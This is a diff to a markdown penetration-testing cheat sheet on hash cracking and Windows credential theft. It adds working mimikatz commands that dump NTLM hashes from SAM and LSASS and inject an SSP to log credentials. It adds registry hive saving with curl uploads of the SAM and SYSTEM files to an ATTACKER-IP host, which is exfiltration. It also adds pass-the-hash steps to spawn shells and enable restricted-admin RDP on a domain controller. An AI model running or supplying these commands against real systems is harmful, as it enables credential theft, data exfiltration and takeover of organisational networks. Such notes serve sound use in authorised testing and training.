@@ -79,10 +79,32 @@ hashcat -m 0 "8743b52063cd84097a65d1633f5c74f5" -r demo.rule /usr/share/wordlist
 Follow a practical rule set
 
 * Extract and Identify hashes e.g. `hash-identifier` or `hashid` or `https://hashes.com/en/tools/hash_identifier` 
-* Format hashes
+* Format the hashes with transformation scripts `/usr/share/john`
 * Calculate the cracking time
 * Prepare wordlist based on rule sets
 * Attack the hash
+
+```bash
+# List all 2john transformation scripts
+ls -1 /usr/*bin/*2john
+find /usr -type f -name "*2john*" 2> /dev/null
+
+ssh2john
+signal2john
+...
+7z2john
+pwsafe2john
+lastpass2john
+bitwarden2john
+dashlane2john
+...
+filezilla2john
+truecrypt2john
+..
+pdf2john
+putty2john
+keepass2john
+```
 
 ## Keepass Cracking
 
@@ -179,38 +201,91 @@ hashcat -m 12001 /tmp/hashes.txt /usr/share/wordlists/fasttrack.txt
 {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
 ```
 
-## NTLM Cracking
+## NTLM Cracking with mimikatz
+
+* Use mimikatz to extract NTLM hashes of **Local Accounts**
+* Use `lsadump::sam` to dump data stored in SAM Folder `C:\Windows\system32\config\sam`
+* Use mimikatz to extract NTLM hashes of **Domain Accounts** f
+* Use `sekurlsa::logonpasswords` extracts the password hash from LSASS memory
+* Use mimikatz to extract NTLM hashes CredentialGuard protects domain accounts (VTL1)
+* Use `misc::memssp` to logon credential to `C:\Windows\System32\mimilsa.log`
+
+It is important to note that **CredentialGuard** is only designed to protect non-local users. This means that we are still able to obtain NTLM hashes for the local users on this machine.
+
+Additionally the SSP (Security Support Provider) can also be registered through the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security` Packages registry key. Each time the system starts up, the Local Security Authority (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.
+
+```powershell
+# Enumerate local account users
+net user
+Get-LocalUser
+Get-ComputerInfo -Property DeviceGuardSecurityServices*
+
+Mimikatz.exe
+# Enabling SeDebugPrivilege, elevating to SYSTEM user, requires SeImpersonatePrivilege 
+privilege::debug
+  20 'OK'
+token::elevate
+  -> Impersonated !
+
+# Extracting NTLM hashes of Local Accounts
+lsadump::sam
+  NTML hash:
+
+# Extract NTML hashes of logged on Domain Accounts
+sekurlsa::logonpasswords
+
+# Inject a SSPI (authenthication provider) to log Domain Accounts to file.
+# This is necessary, if CredentialGuard is in place as protection mechanism.
+  * Username : Administrator
+  * Domain   : CORP
+       * LSA Isolated Data: NtlmHash
+
+misc::memssp
+type C:\Windows\System32\mimilsa.log
+
+```
+
+## NTLM Cracking with regsave and impacket-secretsdump
 
 * **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
 * **Limitation**: Require privileges `SeImpersonatePrivilege` for token elevation
-* Use mimikatz to extract with NTLM hashes
-* Module `sekurlsa` extracts the password hash from LSASS 
-* SAM Folder `C:\Windows\system32\config\sam`
+* Run Windows terminal as Adminstrator
+* Use reg save to save NTLM credentials of **Local Account**
+* Use `reg save HKLM\sam sam`and `reg save HKLM\system system` hive from registry
+* Use `impacket-secretsdump` to extract NTLM hashes
+* Use `hashcat -m 1000 crackme.hash`
 
-```powershell
-# enumerate local users
+```pwsh
+# Enumerate local account users
 net user
 Get-LocalUser
 
-Mimikatz.exe
-# Enabling SeDebugPrivilege, elevating to SYSTEM user 
-privilege::debug
-  20 'OK'
-# Extracting NTLM hashes, requires SeImpersonatePrivilege
-token::elevate
-  -> Impersonated !
-lsadump::sam
-  NTML hash:
-# sekurlsa::logonpasswords
-```
-
-```powershell
 # Extracting NTLM hashes, requires SeImpersonatePrivilege or 
 reg save HKLM\sam sam
 reg save HKLM\system system
+curl -vv -F "uploadedfile=@c:\services\sam" http://ATTACKER-IP/upload.php
+curl -vv -F "uploadedfile=@c:\services\system" http://ATTACKER-IP/upload.php
 ```
 
 ```bash
+impacket-secretsdump -sam uploads/sam -system uploads/system LOCAL
+hashcat --help | grep -i "ntlm"
+  1000 | NTLM ...
+
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  
+```
+
+```pwsh
+# Extracting NTLM hashes, requires SeImpersonatePrivilege or 
+reg save HKLM\sam sam
+reg save HKLM\system system
+
+curl -vv --form "uploadedfile=@c:\services\sam" http://ATTACKER-IP/upload.php
+curl -vv --form "uploadedfile=@c:\services\system" http://ATTACKER-IP/upload.php
+```
+
+```bash
+impacket-secretsdump -sam uploads/sam -system uploads/system LOCAL
 hashcat --help | grep -i "ntlm"
   1000 | NTLM ...
 
@@ -223,8 +298,23 @@ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashca
   * run pwsh as admin
   * get hash with mimikatz
 * authenticate with administrator to a local or remote target with **username and NTLM hash**
+* RDP tools `sekurlsa::pth /run:"mstsc.exe /restrictedadmin"` or `xfreerdp3 /pth:`
 * SMB tools `smbclient` or `CrackMapExec`
 * RCE tools `impacket-psexec` or `impacket-wmiexec`
+* Use `impacket-*` lookup more tools `impacket-scripts` package
+
+```bash
+# Search for impacket-scripts
+sudo find / -type f -name "impacket-*" 2> /dev/null   
+/var/lib/dpkg/info/impacket-scripts.list
+ls -1 /usr/*bin/impacket-*
+
+/usr/bin/impacket-dpapi
+/usr/bin/impacket-mimikatz
+/usr/bin/impacket-smbclient
+/usr/bin/impacket-secretsdump
+/usr/bin/impacket-ntlmrelayx
+```
 
 ```powershell
 # run pwsh as admin
@@ -232,6 +322,53 @@ powershell Start-Process -Verb Runas powershell
 # get admin hash using mimikatz
 User : Administrator
   Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+```
+
+## Use mimikatz sekurlsa pass-the-hash to enable Remote Desktop on Domain Controller
+
+Scenario
+
+* **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
+* **Limitation**: Require privileges `SeImpersonatePrivilege` for token elevation
+* Run CMD session with Domain Admin
+* Run PSExec.exe to spawn a shell on Domain Controller
+* Add Registry Entry to allow RestrictedAdmin RDP loggon
+
+Source <https://www.hornetsecurity.com/en/blog/pass-the-hash-attack/>
+
+While still in our Mimikatz session, run the following command to create a CMD session as the user.
+
+```shell
+mimikatz# sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<NTLM Hash>
+```
+
+```shell
+# Spawn cmd on Domain Controller
+copy \\ATTACKER\share\PSTool.zip .
+PSExec.exe \\DOMAIN-CTRL cmd.exe
+cd c:\windows\ntds
+```
+
+We can take it one step further, and RDP onto the Domain Controller for more freedom. We can add a new registry item to the Domain Controller to allow RDP-restricted admin with the following command in PowerShell.
+
+```pwsh
+# Enable Remote Desktop on the Domain Controller
+New-ItemProperty -Path “HKLM:\System\CurrentControlSet\Control\Lsa” -Name “DisableRestrictedAdmin” -Value “0” -PropertyType DWORD
+```
+
+After successfully allowing RDP-restricted access, we can run the following command back in Mimikatz to initiate an RDP session with the NTLM hash. The option `/restrictedadmin` is important as it suppresses a password prompt.
+
+```shell
+#Spawn Remote Desktop Session on Domain Controller
+mimikatz# sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<NTLM Hash> /run:”mstsc.exe /restrictedadmin”
+```
+
+## Use xfreerdp3 with pass-the-hash
+
+The linux xfreerdp3 suppports NTLM pass-the-hash. Hence, when NTLM hash can be extracted there is no need to crack passwords. This works when restrictedadmin is enabled.
+
+```bash
+xfreerdp3 +clipboard /cert:inore /u:"DOMAIN\\User" /v:IP /pth:HIDDEN
 ```
 
 ## Use SMB tool smbclient with pass-the-hash
@@ -257,15 +394,21 @@ C:\Windows\system32> whoami
 NT authority\system
 ```
 
+## Use RCE tool impacket-wmiexec with pass-the-hash
+
+Wmiexec uses Distributed Component Object Model ("DCOM") to connect remotely to a system. The threat actor’s execution of wmiexec.py will establish their connection with DCOM/RPC on port 135, the response back to the threat actor system is sent via the Server Message Block ("SMB") protocol.
+
 ```bash
 impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3
 ...
 C:\>whoami
 files02\administrator
 ```
-
 ## Abuse Net-NTLMv2 Auth Protocol
 
+Scenario
+
+* No Administration account on Windows to retrieve SAM with mimikatz
 * Abuse the Net-NTLMv2 network authentication protocol
 * Use `Responder` tool to setup a honeypot and print captured hashes
 * Supported protocols are:
@@ -359,6 +502,10 @@ PS> Invoke-Inveigh -NBNS N -LLMNR N -ConsoleOutput Y -IP 192.168.0.2
 ```
 
 ## Abusing Net-NTLMv2 Relay Attack
+
+Scenario
+
+Requires Active Directory
 
 This tool `impacket-ntlmrelayx` does the relay attack by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.
 
